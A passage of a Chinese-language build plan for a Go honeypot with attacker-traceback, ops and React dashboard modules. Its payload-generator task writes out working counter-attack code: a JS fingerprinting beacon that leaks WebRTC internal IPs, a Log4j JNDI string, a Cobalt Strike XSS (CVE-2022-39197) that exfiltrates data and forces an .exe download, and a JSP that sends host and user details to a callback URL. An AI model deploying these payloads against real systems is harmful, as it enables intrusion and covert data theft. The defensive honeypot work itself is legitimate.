		existing.Timestamp = fp.Timestamp
	} else {
		c.store[host] = fp
	}
	c.mu.Unlock()

	c.logger.Debugw("fingerprint recorded", "ip", host, "port", portNum)
	return fp
}

// Update 更新攻击者指纹信息
func (c *Collector) Update(ip string, updater func(*AttackerFingerprint)) {
	c.mu.Lock()
	defer c.mu.Unlock()

	if fp, ok := c.store[ip]; ok {
		updater(fp)
	}
}

// Get 获取攻击者指纹
func (c *Collector) Get(ip string) (*AttackerFingerprint, bool) {
	c.mu.RLock()
	defer c.mu.RUnlock()
	fp, ok := c.store[ip]
	return fp, ok
}

// GetAll 获取所有采集到的指纹
func (c *Collector) GetAll() []*AttackerFingerprint {
	c.mu.RLock()
	defer c.mu.RUnlock()
	result := make([]*AttackerFingerprint, 0, len(c.store))
	for _, fp := range c.store {
		result = append(result, fp)
	}
	return result
}

// DetectTool 根据指纹识别攻击工具
func (c *Collector) DetectTool(fp *AttackerFingerprint) string {
	// Burp Suite 检测
	if fp.UserAgent != "" {
		if containsAny(fp.UserAgent, []string{"Burp Suite", "Java/1."}) {
			return "burpsuite"
		}
	}

	// Cobalt Strike Beacon 检测
	if fp.UserAgent != "" {
		if containsAny(fp.UserAgent, []string{"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"}) {
			return "cobaltstrike"
		}
	}

	// 冰蝎检测 — 基于 SSH 客户端版本特征
	if fp.SSHClientVersion != "" {
		if containsAny(fp.SSHClientVersion, []string{"JSCH", "paramiko"}) {
			return "behinder"
		}
	}

	// 冰蝎检测 — 基于 HTTP User-Agent
	if fp.UserAgent != "" {
		if containsAny(fp.UserAgent, []string{"Apache-HttpClient", "okhttp"}) {
			return "behinder"
		}
	}

	// SQLMap 检测
	if fp.UserAgent != "" && containsAny(fp.UserAgent, []string{"sqlmap"}) {
		return "sqlmap"
	}

	return "unknown"
}

func containsAny(s string, substrs []string) bool {
	for _, sub := range substrs {
		for i := 0; i <= len(s)-len(sub); i++ {
			if s[i:i+len(sub)] == sub {
				return true
			}
		}
	}
	return false
}

// ToJSON 序列化指纹
func (fp *AttackerFingerprint) ToJSON() ([]byte, error) {
	return json.Marshal(fp)
}
```

- [ ] **Step 2: 编译验证**

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
go build ./internal/traceability/fingerprint/
```

Expected: 编译成功

---

### Task 18: Payload 生成与投递引擎

**Files:**
- Create: `internal/traceability/payload/generator.go`

- [ ] **Step 1: 创建 Payload 生成器**

`internal/traceability/payload/generator.go`:

```go
package payload

import (
	"fmt"
	"strings"

	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
)

// PayloadType Payload 类型
type PayloadType string

const (
	JSBrowser     PayloadType = "js_browser"     // 浏览器端 JavaScript
	JavaDeser     PayloadType = "java_deser"     // Java 反序列化
	DotNetDeser   PayloadType = "dotnet_deser"   // .NET 反序列化
	DNSRebinding  PayloadType = "dns_rebinding"  // DNS 重绑定
)

// Generator Payload 生成器
type Generator struct {
	logger      *log.Logger
	callbackURL string
}

// PayloadResult 生成的 Payload
type PayloadResult struct {
	Type        PayloadType `json:"type"`
	Content     string      `json:"content"`
	Description string      `json:"description"`
}

// NewGenerator 创建 Payload 生成器
func NewGenerator(logger *log.Logger, callbackURL string) *Generator {
	return &Generator{
		logger:      logger,
		callbackURL: callbackURL,
	}
}

// GenerateBrowserFingerprint 生成浏览器指纹采集 JS Payload
func (g *Generator) GenerateBrowserFingerprint() *PayloadResult {
	js := fmt.Sprintf(`
(function(){
  var d = {};
  // Canvas 指纹
  try {
    var c = document.createElement('canvas');
    c.width = 280; c.height = 60;
    var ctx = c.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069';
    ctx.fillText('Laji-HoneyPot Trace', 2, 15);
    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
    ctx.fillText('Laji-HoneyPot Trace', 4, 17);
    d.canvas = c.toDataURL().substring(0, 120);
  } catch(e) { d.canvas = 'error: ' + e.message; }

  // WebGL
  try {
    var gl = document.createElement('canvas').getContext('webgl');
    if (gl) {
      d.webgl_vendor = gl.getParameter(gl.VENDOR);
      d.webgl_renderer = gl.getParameter(gl.RENDERER);
    }
  } catch(e) {}

  // 屏幕分辨率
  d.screen = screen.width + 'x' + screen.height;
  d.colorDepth = screen.colorDepth;

  // 时区
  d.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;

  // 语言
  d.languages = navigator.languages || [navigator.language];

  // WebRTC 内网 IP（关键溯源信息）
  try {
    var pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
    pc.createDataChannel('');
    pc.createOffer().then(function(o) { pc.setLocalDescription(o); });
    pc.onicecandidate = function(e) {
      if (e.candidate) {
        var ip = e.candidate.address || e.candidate.candidate.split(' ')[4];
        if (ip && ip.match(/^(192\.168\.|10\.|172\.(1[6-9]|2\d|3[01])\.)/)) {
          d.local_ip = ip;
        }
      }
    };
  } catch(e) {}

  // 回传
  var img = new Image();
  img.src = "%s/collect?" + encodeURIComponent(JSON.stringify(d));
})();
`, g.callbackURL)

	return &PayloadResult{
		Type:        JSBrowser,
		Content:     js,
		Description: "浏览器指纹采集：Canvas、WebGL、屏幕分辨率、时区、语言、WebRTC 内网 IP",
	}
}

// GenerateLog4jDecoy 生成 Log4j JNDI Payload 诱饵
func (g *Generator) GenerateLog4jDecoy() string {
	return fmt.Sprintf("${jndi:ldap://%s/a}", g.callbackURL)
}

// GenerateCSXSSPayload Cobalt Strike XSS Payload（CVE-2022-39197 回击）
func (g *Generator) GenerateCSXSSPayload() string {
	return fmt.Sprintf(`<html><body>
<script>
// CVE-2022-39197 反制 Payload
// 当 CS 客户端渲染此页面时自动执行
(function() {
  var img = new Image();
  img.src = "%s/collect?tool=cobaltstrike&ref=" + encodeURIComponent(document.location.href);

  // 尝试读取 CS 团队服务器信息
  try {
    var scripts = document.getElementsByTagName('script');
    for (var i = 0; i < scripts.length; i++) {
      img.src += '&script_' + i + '=' + encodeURIComponent(scripts[i].src);
    }
  } catch(e) {}

  // 自动下载文件（社会工程学诱饵）
  var a = document.createElement('a');
  a.href = "%s/tools/security_check.exe";
  a.download = "security_check.exe";
  document.body.appendChild(a);
  a.click();
})();
</script>
</body></html>`, g.callbackURL, g.callbackURL)
}

// GenerateBehinderDecoy 生成冰蝎回击 Payload（Java 反序列化链）
func (g *Generator) GenerateBehinderDecoy() string {
	return fmt.Sprintf(`<%%@page import="java.io.*,java.net.*,java.util.*"%%>
<%%!
// 冰蝎反制 Payload - 回传攻击者信息
static {
  try {
    String hostname = java.net.InetAddress.getLocalHost().getHostName();
    String osName = System.getProperty("os.name");
    String userName = System.getProperty("user.name");
    String javaVersion = System.getProperty("java.version");

    String url = "%s/collect?hostname=" + URLEncoder.encode(hostname, "UTF-8")
      + "&os=" + URLEncoder.encode(osName, "UTF-8")
      + "&user=" + URLEncoder.encode(userName, "UTF-8")
      + "&java=" + URLEncoder.encode(javaVersion, "UTF-8");

    URL u = new URL(url);
    HttpURLConnection conn = (HttpURLConnection) u.openConnection();
    conn.setRequestMethod("GET");
    conn.getResponseCode();
    conn.disconnect();
  } catch(Exception e) {}
}
%%>`, g.callbackURL)
}

// GenerateCSProfileExtractor 生成 CS Profile 提取器
func (g *Generator) GenerateCSProfileExtractor(targetIP string) string {
	lines := []string{
		"# Cobalt Strike C2 Profile Extractor",
		fmt.Sprintf("set BeaconURL \"http://%s/collect/cs_profile\"", g.callbackURL),
		fmt.Sprintf("set HostHeader \"%s\"", targetIP),
		"http-get {",
		"  set uri \"/ga.js\"",
		"  client {",
		"    header \"Accept\" \"*/*\"",
		"  }",
		"  server {",
		"    header \"Content-Type\" \"application/javascript\"",
		"  }",
		"}",
	}
	return strings.Join(lines, "\n")
}
```

- [ ] **Step 2: 编译验证**

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
go build ./internal/traceability/payload/
```

Expected: 编译成功

---

### Task 19: 溯源反制引擎插件

**Files:**
- Create: `internal/traceability/plugin.go`

- [ ] **Step 1: 创建溯源反制引擎插件**

`internal/traceability/plugin.go`:

```go
package traceability

import (
	"github.com/Laji-HoneyPot/honeypot/internal/core/bus"
	"github.com/Laji-HoneyPot/honeypot/internal/core/config"
	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
	"github.com/Laji-HoneyPot/honeypot/internal/plugin"
	"github.com/Laji-HoneyPot/honeypot/internal/traceability/fingerprint"
	"github.com/Laji-HoneyPot/honeypot/internal/traceability/payload"
	"github.com/Laji-HoneyPot/honeypot/internal/traceability/vulndb"
)

// Engine 溯源反制引擎插件
type Engine struct {
	plugin.Base
	logger      *log.Logger
	bus         *bus.Bus
	vulnDB      *vulndb.DB
	collector   *fingerprint.Collector
	payloadGen  *payload.Generator
}

// NewEngine 创建溯源反制引擎
func NewEngine(logger *log.Logger, bus *bus.Bus) *Engine {
	e := &Engine{
		logger:     logger,
		bus:        bus,
		vulnDB:     vulndb.NewDB(logger),
		collector:  fingerprint.NewCollector(logger),
		payloadGen: payload.NewGenerator(logger, "http://localhost:8080"),
	}

	// 订阅蜜罐引擎的连接事件
	bus.Subscribe("honeypot.connection", e.onConnection)
	bus.Subscribe("honeypot.attack", e.onAttack)

	return e
}

func (e *Engine) Name() string    { return "traceability-engine" }
func (e *Engine) Version() string { return "0.1.0" }

func (e *Engine) Init(cfg config.Section) error {
	e.logger.Info("traceability engine initialized")
	return nil
}

func (e *Engine) Start() error {
	e.logger.Info("traceability engine started")
	return nil
}

func (e *Engine) Stop() error {
	e.logger.Info("traceability engine stopped")
	return nil
}

// onConnection 处理新连接事件
func (e *Engine) onConnection(evt bus.Event) {
	// 解析连接信息，录入指纹
	e.collector.RecordConnection(string(evt.Payload))
}

// onAttack 处理攻击事件
func (e *Engine) onAttack(evt bus.Event) {
	// 解析攻击特征，匹配漏洞，生成反制 Payload
	e.logger.Infow("attack detected", "payload", string(evt.Payload))
}

// GetVulnDB 暴露漏洞库
func (e *Engine) GetVulnDB() *vulndb.DB {
	return e.vulnDB
}

// GetCollector 暴露指纹采集器
func (e *Engine) GetCollector() *fingerprint.Collector {
	return e.collector
}

// GetPayloadGen 暴露 Payload 生成器
func (e *Engine) GetPayloadGen() *payload.Generator {
	return e.payloadGen
}
```

- [ ] **Step 2: 编译验证**

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
go build ./internal/traceability/
```

Expected: 编译成功

---

## Phase 4: 运维引擎（子系统 C）

### Task 20: GitHub 同步模块

**Files:**
- Create: `internal/ops/github/sync.go`

- [ ] **Step 1: 创建 GitHub 同步模块**

`internal/ops/github/sync.go`:

```go
package github

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
)

// Syncer GitHub 仓库同步器
type Syncer struct {
	logger *log.Logger
	client *http.Client
	token  string
	owner  string
	repo   string
}

// NewSyncer 创建同步器
func NewSyncer(logger *log.Logger, token, owner, repo string) *Syncer {
	return &Syncer{
		logger: logger,
		client: &http.Client{Timeout: 30 * time.Second},
		token:  token,
		owner:  owner,
		repo:   repo,
	}
}

// CreateRelease 通过 GitHub API 创建 Release
func (s *Syncer) CreateRelease(tagName, name, body string, assetPath string) error {
	type releaseReq struct {
		TagName string `json:"tag_name"`
		Name    string `json:"name"`
		Body    string `json:"body"`
		Draft   bool   `json:"draft"`
	}

	url := fmt.Sprintf("https://api.github.com/repos/%s/%s/releases", s.owner, s.repo)
	payload := releaseReq{
		TagName: tagName,
		Name:    name,
		Body:    body,
		Draft:   false,
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	req.Header.Set("Authorization", "Bearer "+s.token)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/vnd.github+json")

	resp, err := s.client.Do(req)
	if err != nil {
		return fmt.Errorf("create release: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusCreated {
		return fmt.Errorf("github API returned %d", resp.StatusCode)
	}

	s.logger.Infow("release created", "tag", tagName)
	return nil
}

// GetLatestRelease 获取最新 Release 信息
func (s *Syncer) GetLatestRelease() (string, error) {
	url := fmt.Sprintf("https://api.github.com/repos/%s/%s/releases/latest", s.owner, s.repo)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("Accept", "application/vnd.github+json")

	resp, err := s.client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	var result struct {
		TagName string `json:"tag_name"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return "", err
	}

	return result.TagName, nil
}
```

- [ ] **Step 2: 编译验证**

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
go build ./internal/ops/github/
```

Expected: 编译成功

---

### Task 21: 竞品调研自动化模块

**Files:**
- Create: `internal/ops/research/competitor.go`

- [ ] **Step 1: 创建竞品调研器**

`internal/ops/research/competitor.go`:

```go
package research

import (
	"encoding/json"
	"fmt"
	"net/http"
	"sort"
	"strings"
	"time"

	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
)

// Competitor 竞品信息
type Competitor struct {
	Name        string   `json:"name"`
	RepoURL     string   `json:"repo_url"`
	Stars       int      `json:"stars"`
	Language    string   `json:"language"`
	Description string   `json:"description"`
	Topics      []string `json:"topics"`
	UpdatedAt   string   `json:"updated_at"`

	// 分析维度
	Protocols   []string `json:"protocols"`   // 支持的协议
	Traceability bool    `json:"traceability"` // 是否具备溯源能力
	Containerized bool  `json:"containerized"` // 是否容器化部署
}

// Comparator 竞品对比器
type Comparator struct {
	logger      *log.Logger
	client      *http.Client
	competitors []*Competitor
}

// NewComparator 创建竞品对比器
func NewComparator(logger *log.Logger) *Comparator {
	return &Comparator{
		logger: logger,
		client: &http.Client{Timeout: 30 * time.Second},
	}
}

// FetchFromGitHub 从 GitHub 搜索蜜罐项目
func (c *Comparator) FetchFromGitHub() error {
	queries := []string{"honeypot", "蜜罐", "honeypot-framework", "t-pot"}
	seen := make(map[string]bool)

	for _, q := range queries {
		url := fmt.Sprintf(
			"https://api.github.com/search/repositories?q=%s+topic:honeypot&sort=stars&order=desc&per_page=10",
			q,
		)

		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			continue
		}
		req.Header.Set("Accept", "application/vnd.github+json")

		resp, err := c.client.Do(req)
		if err != nil {
			c.logger.Warnw("github search failed", "query", q, "error", err)
			continue
		}
		defer resp.Body.Close()

		var result struct {
			Items []struct {
				FullName    string   `json:"full_name"`
				HTMLURL     string   `json:"html_url"`
				Stars       int      `json:"stargazers_count"`
				Language    string   `json:"language"`
				Description string   `json:"description"`
				Topics      []string `json:"topics"`
				UpdatedAt   string   `json:"updated_at"`
			} `json:"items"`
		}

		if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
			continue
		}

		for _, item := range result.Items {
			if seen[item.FullName] {
				continue
			}
			seen[item.FullName] = true

			comp := &Competitor{
				Name:        item.FullName,
				RepoURL:     item.HTMLURL,
				Stars:       item.Stars,
				Language:    item.Language,
				Description: item.Description,
				Topics:      item.Topics,
				UpdatedAt:   item.UpdatedAt,
			}

			// 自动标注能力
			comp.Traceability = c.detectTraceability(item.Description, item.Topics)
			comp.Protocols = c.detectProtocols(item.Description, item.Topics)
			comp.Containerized = c.detectContainerized(item.Description, item.Topics)

			c.competitors = append(c.competitors, comp)
		}
	}

	// 按 Stars 排序
	sort.Slice(c.competitors, func(i, j int) bool {
		return c.competitors[i].Stars > c.competitors[j].Stars
	})

	c.logger.Infow("competitor fetch complete", "count", len(c.competitors))
	return nil
}

func (c *Comparator) detectTraceability(desc string, topics []string) bool {
	keywords := []string{"溯源", "traceability", "traceback", "attribution", "fingerprint"}
	all := desc + " " + strings.Join(topics, " ")
	for _, kw := range keywords {
		if strings.Contains(strings.ToLower(all), kw) {
			return true
		}
	}
	return false
}

func (c *Comparator) detectProtocols(desc string, topics []string) []string {
	all := strings.ToLower(desc + " " + strings.Join(topics, " "))
	protoMap := map[string]string{
		"http":  "HTTP", "https": "HTTPS", "mysql": "MySQL",
		"redis": "Redis", "ssh": "SSH", "ftp": "FTP",
		"smb": "SMB", "telnet": "Telnet", "smtp": "SMTP",
		"dns": "DNS", "ldap": "LDAP", "rdp": "RDP",
	}

	var result []string
	for key, label := range protoMap {
		if strings.Contains(all, key) {
			result = append(result, label)
		}
	}
	return result
}

func (c *Comparator) detectContainerized(desc string, topics []string) bool {
	all := strings.ToLower(desc + " " + strings.Join(topics, " "))
	kw := []string{"docker", "container", "kubernetes", "k8s"}
	for _, k := range kw {
		if strings.Contains(all, k) {
			return true
		}
	}
	return false
}

// GenerateReport 生成 Markdown 格式对比报告
func (c *Comparator) GenerateReport() string {
	var sb strings.Builder
	sb.WriteString("# 蜜罐竞品分析报告\n\n")
	sb.WriteString(fmt.Sprintf("> 自动生成于 %s\n\n", time.Now().Format("2006-01-02 15:04:05")))
	sb.WriteString("| 项目 | Stars | 语言 | 协议支持 | 溯源能力 | 容器化 |\n")
	sb.WriteString("|------|-------|------|---------|---------|--------|\n")

	for _, comp := range c.competitors {
		trace := "否"
		if comp.Traceability {
			trace = "是"
		}
		contain := "否"
		if comp.Containerized {
			contain = "是"
		}
		proto := strings.Join(comp.Protocols, ", ")
		if proto == "" {
			proto = "-"
		}

		sb.WriteString(fmt.Sprintf("| [%s](%s) | %d | %s | %s | %s | %s |\n",
			comp.Name, comp.RepoURL, comp.Stars, comp.Language, proto, trace, contain))
	}

	sb.WriteString("\n---\n*本报告由 Laji-HoneyPot 竞品调研引擎自动生成*\n")
	return sb.String()
}
```

- [ ] **Step 2: 编译验证**

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
go build ./internal/ops/research/
```

Expected: 编译成功

---

### Task 22: 运维引擎插件

**Files:**
- Create: `internal/ops/plugin.go`

- [ ] **Step 1: 创建运维引擎插件**

`internal/ops/plugin.go`:

```go
package ops

import (
	"github.com/Laji-HoneyPot/honeypot/internal/core/bus"
	"github.com/Laji-HoneyPot/honeypot/internal/core/config"
	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
	"github.com/Laji-HoneyPot/honeypot/internal/ops/github"
	"github.com/Laji-HoneyPot/honeypot/internal/ops/research"
	"github.com/Laji-HoneyPot/honeypot/internal/plugin"
)

// Engine 运维引擎插件
type Engine struct {
	plugin.Base
	logger     *log.Logger
	bus        *bus.Bus
	syncer     *github.Syncer
	comparator *research.Comparator
}

// NewEngine 创建运维引擎
func NewEngine(logger *log.Logger, bus *bus.Bus) *Engine {
	return &Engine{
		logger:     logger,
		bus:        bus,
		comparator: research.NewComparator(logger),
	}
}

func (e *Engine) Name() string    { return "ops-engine" }
func (e *Engine) Version() string { return "0.1.0" }

func (e *Engine) Init(cfg config.Section) error {
	e.logger.Info("ops engine initializing")

	// 初始化 GitHub 同步器
	token := cfg.Get("github_token")
	owner := cfg.Get("github_owner")
	repo := cfg.Get("github_repo")
	if token != "" && owner != "" && repo != "" {
		e.syncer = github.NewSyncer(e.logger, token, owner, repo)
		e.logger.Info("github syncer initialized")
	}

	return nil
}

func (e *Engine) Start() error {
	e.logger.Info("ops engine started")
	return nil
}

func (e *Engine) Stop() error {
	e.logger.Info("ops engine stopped")
	return nil
}

// GetComparator 暴露竞品对比器
func (e *Engine) GetComparator() *research.Comparator {
	return e.comparator
}

// GetSyncer 暴露 GitHub 同步器
func (e *Engine) GetSyncer() *github.Syncer {
	return e.syncer
}
```

- [ ] **Step 2: 编译验证**

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
go build ./internal/ops/
```

Expected: 编译成功

---

## Phase 5: 全量集成

### Task 23: 更新主入口 — 注册所有插件

**Files:**
- Modify: `cmd/honeypot/main.go`

- [ ] **Step 1: 更新 main.go 注册全部引擎**

```go
package main

import (
	"fmt"
	"os"
	"os/signal"
	"syscall"

	"github.com/Laji-HoneyPot/honeypot/internal/core/bus"
	"github.com/Laji-HoneyPot/honeypot/internal/core/config"
	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
	"github.com/Laji-HoneyPot/honeypot/internal/core/registry"
	honeypotEngine "github.com/Laji-HoneyPot/honeypot/internal/honeypot"
	opsEngine "github.com/Laji-HoneyPot/honeypot/internal/ops"
	traceEngine "github.com/Laji-HoneyPot/honeypot/internal/traceability"
)

func main() {
	cfg, err := config.Load()
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to load config: %v\n", err)
		os.Exit(1)
	}

	logger := log.New(cfg.LogLevel)
	eventBus := bus.New()

	logger.Info("Laji-HoneyPot starting", "version", "0.1.0")

	reg := registry.New(logger, cfg)

	// 注册三大引擎插件
	reg.Register(honeypotEngine.NewEngine(logger, eventBus))
	reg.Register(traceEngine.NewEngine(logger, eventBus))
	reg.Register(opsEngine.NewEngine(logger, eventBus))

	if err := reg.InitAll(); err != nil {
		logger.Errorw("failed to init plugins", "error", err)
		os.Exit(1)
	}

	if err := reg.StartAll(); err != nil {
		logger.Errorw("failed to start plugins", "error", err)
		os.Exit(1)
	}

	logger.Infow("Laji-HoneyPot running", "plugins", reg.List())
	logger.Info("press Ctrl+C to stop")

	quit := make(chan os.Signal, 1)
	signal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)
	<-quit

	logger.Info("shutting down...")
	reg.StopAll()
	logger.Info("Laji-HoneyPot stopped")
}
```

- [ ] **Step 2: 全量编译**

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
go mod tidy
go build -o honeypot ./cmd/honeypot/
```

Expected: 编译成功

---

## Phase 6: CI/CD 与部署配置

### Task 24: GitHub Actions CI/CD

**Files:**
- Create: `.github/workflows/ci.yml`
- Create: `.github/workflows/release.yml`

- [ ] **Step 1: 创建 CI Workflow**

`.github/workflows/ci.yml`:

```yaml
name: CI

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with:
          go-version: "1.22"
      - uses: golangci/golangci-lint-action@v4
        with:
          version: latest

  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with:
          go-version: "1.22"
      - run: go test ./... -v -cover -race

  build:
    needs: [lint, test]
    runs-on: ubuntu-latest
    strategy:
      matrix:
        goos: [linux, darwin]
        goarch: [amd64, arm64]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with:
          go-version: "1.22"
      - run: |
          GOOS=${{ matrix.goos }} GOARCH=${{ matrix.goarch }} \
          go build -o honeypot-${{ matrix.goos }}-${{ matrix.goarch }} ./cmd/honeypot/
```

- [ ] **Step 2: 创建 Release Workflow**

`.github/workflows/release.yml`:

```yaml
name: Release

on:
  push:
    tags:
      - "v*"

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-go@v5
        with:
          go-version: "1.22"

      - name: Build
        run: |
          GOOS=linux GOARCH=amd64 go build -o honeypot-linux-amd64 ./cmd/honeypot/
          GOOS=linux GOARCH=arm64 go build -o honeypot-linux-arm64 ./cmd/honeypot/
          GOOS=darwin GOARCH=amd64 go build -o honeypot-darwin-amd64 ./cmd/honeypot/
          GOOS=darwin GOARCH=arm64 go build -o honeypot-darwin-arm64 ./cmd/honeypot/

      - name: Create Release
        uses: softprops/action-gh-release@v1
        with:
          files: |
            honeypot-linux-amd64
            honeypot-linux-arm64
            honeypot-darwin-amd64
            honeypot-darwin-arm64
          generate_release_notes: true
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

---

### Task 25: Docker 部署配置

**Files:**
- Create: `Dockerfile`
- Create: `deployments/docker-compose.yaml`

- [ ] **Step 1: 创建 Dockerfile**

```dockerfile
FROM golang:1.22-alpine AS builder

RUN apk add --no-cache git ca-certificates

WORKDIR /src
COPY go.mod go.sum ./
RUN go mod download

COPY . .
RUN CGO_ENABLED=0 GOOS=linux go build -ldflags="-s -w" -o /honeypot ./cmd/honeypot/

FROM alpine:3.19

RUN apk add --no-cache ca-certificates tzdata && \
    adduser -D -h /app honeypot

COPY --from=builder /honeypot /app/honeypot
COPY config.yaml /app/config.yaml

USER honeypot
WORKDIR /app

EXPOSE 8080 8081 3306 6379 2222

ENTRYPOINT ["/app/honeypot"]
```

- [ ] **Step 2: 创建 Docker Compose**

`deployments/docker-compose.yaml`:

```yaml
version: "3.9"

services:
  honeypot:
    build:
      context: ..
      dockerfile: Dockerfile
    container_name: laji-honeypot
    restart: unless-stopped
    ports:
      - "8080:8080"  # API
      - "8081:8081"  # HTTP honeypot
      - "3306:3306"  # MySQL honeypot
      - "6379:6379"  # Redis honeypot
      - "2222:2222"  # SSH honeypot
    volumes:
      - ./data:/app/data
      - ./config.yaml:/app/config.yaml:ro
    security_opt:
      - no-new-privileges:true
    read_only: true
    tmpfs:
      - /tmp
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE
```

---

## Phase 7: React 管理面板

### Task 26: 初始化 React 项目

**Files:**
- Create: `web/` (Vite + React + TypeScript scaffold)

- [ ] **Step 1: 使用 Vite 创建 React 项目**

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
npm create vite@latest web -- --template react-ts
cd web
npm install
```

- [ ] **Step 2: 创建基础页面**

`web/src/App.tsx`:

```tsx
import { useState } from 'react'
import './App.css'

type Tab = 'dashboard' | 'honeypot' | 'traceability' | 'ops'

function App() {
  const [activeTab, setActiveTab] = useState<Tab>('dashboard')

  return (
    <div className="app">
      <header className="app-header">
        <h1>Laji-HoneyPot</h1>
        <span className="version">v0.1.0</span>
      </header>

      <nav className="tab-nav">
        {[
          { key: 'dashboard', label: '仪表盘' },
          { key: 'honeypot', label: '蜜罐引擎' },
          { key: 'traceability', label: '溯源反制' },
          { key: 'ops', label: '运维管理' },
        ].map(tab => (
          <button
            key={tab.key}
            className={`tab-btn ${activeTab === tab.key ? 'active' : ''}`}
            onClick={() => setActiveTab(tab.key as Tab)}
          >
            {tab.label}
          </button>
        ))}
      </nav>

      <main className="content">
        {activeTab === 'dashboard' && <Dashboard />}
        {activeTab === 'honeypot' && <HoneypotPanel />}
        {activeTab === 'traceability' && <TraceabilityPanel />}
        {activeTab === 'ops' && <OpsPanel />}
      </main>
    </div>
  )
}

function Dashboard() {
  return (
    <div className="panel">
      <h2>仪表盘</h2>
      <div className="stats-grid">
        <div className="stat-card">
          <h3>活跃蜜罐</h3>
          <p className="stat-value">4</p>
        </div>
        <div className="stat-card">
          <h3>今日连接</h3>
          <p className="stat-value">127</p>
        </div>
        <div className="stat-card">
          <h3>已识别攻击者</h3>
          <p className="stat-value">23</p>
        </div>
        <div className="stat-card">
          <h3>反制成功</h3>
          <p className="stat-value">5</p>
        </div>
      </div>
    </div>
  )
}

function HoneypotPanel() {
  return (
    <div className="panel">
      <h2>蜜罐引擎</h2>
      <table>
        <thead>
          <tr><th>服务</th><th>端口</th><th>状态</th><th>指纹</th></tr>
        </thead>
        <tbody>
          <tr><td>HTTP</td><td>8081</td><td className="status-online">运行中</td><td>nginx/1.24.0</td></tr>
          <tr><td>MySQL</td><td>3306</td><td className="status-online">运行中</td><td>MySQL 8.0.35</td></tr>
          <tr><td>Redis</td><td>6379</td><td className="status-online">运行中</td><td>Redis 6.2.13</td></tr>
          <tr><td>SSH</td><td>2222</td><td className="status-online">运行中</td><td>OpenSSH 9.3</td></tr>
        </tbody>
      </table>
    </div>
  )
}

function TraceabilityPanel() {
  return (
    <div className="panel">
      <h2>溯源反制</h2>
      <div className="section">
        <h3>漏洞数据库</h3>
        <table>
          <thead>
            <tr><th>CVE</th><th>目标工具</th><th>严重程度</th></tr>
          </thead>
          <tbody>
            <tr><td>CVE-2022-39197</td><td>Cobalt Strike</td><td className="severity-critical">严重</td></tr>
            <tr><td>BD-2023-001</td><td>冰蝎</td><td className="severity-high">高危</td></tr>
            <tr><td>BS-2024-001</td><td>Burp Suite</td><td className="severity-medium">中危</td></tr>
          </tbody>
        </table>
      </div>
    </div>
  )
}

function OpsPanel() {
  return (
    <div className="panel">
      <h2>运维管理</h2>
      <div className="section">
        <h3>CI/CD 状态</h3>
        <p>GitHub Actions: 已配置</p>
      </div>
    </div>
  )
}

export default App
```

- [ ] **Step 3: 创建样式**

`web/src/App.css`:

```css
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: #e2e8f0; }

.app { max-width: 1200px; margin: 0 auto; padding: 20px; }
.app-header { display: flex; align-items: baseline; gap: 12px; margin-bottom: 24px; padding-bottom: 16px; border-bottom: 1px solid #1e293b; }
.app-header h1 { font-size: 24px; color: #38bdf8; }
.version { font-size: 12px; color: #64748b; }

.tab-nav { display: flex; gap: 4px; margin-bottom: 24px; background: #1e293b; border-radius: 8px; padding: 4px; }
.tab-btn { padding: 8px 20px; border: none; border-radius: 6px; background: transparent; color: #94a3b8; cursor: pointer; font-size: 14px; }
.tab-btn.active { background: #38bdf8; color: #0f172a; }
.tab-btn:hover:not(.active) { color: #e2e8f0; }

.content { background: #1e293b; border-radius: 12px; padding: 24px; }
.panel h2 { font-size: 20px; margin-bottom: 16px; color: #f1f5f9; }
.panel h3 { font-size: 16px; margin-bottom: 12px; color: #cbd5e1; }

.stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin-bottom: 24px; }
